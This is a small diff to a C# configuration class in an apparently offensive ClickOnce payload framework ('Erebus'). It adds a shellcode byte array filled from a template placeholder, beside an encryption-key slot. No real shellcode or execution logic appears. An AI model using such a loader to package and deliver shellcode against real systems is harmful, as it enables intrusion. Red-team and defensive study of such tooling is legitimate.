@@ -36,5 +36,9 @@ namespace Erebus.ClickOnce
         /// Leave empty for no encryption
         /// </summary>
         public static byte[] EncryptionKey = new byte[] { {{ ENCRYPTION_KEY }} };
+        /// <summary>
+        /// Shellcode Byte Array
+        /// </summary>
+        public static byte[] Shellcode = new byte[] { {{ ENCRYPTION_SHELLCODE }} };
     }
 }
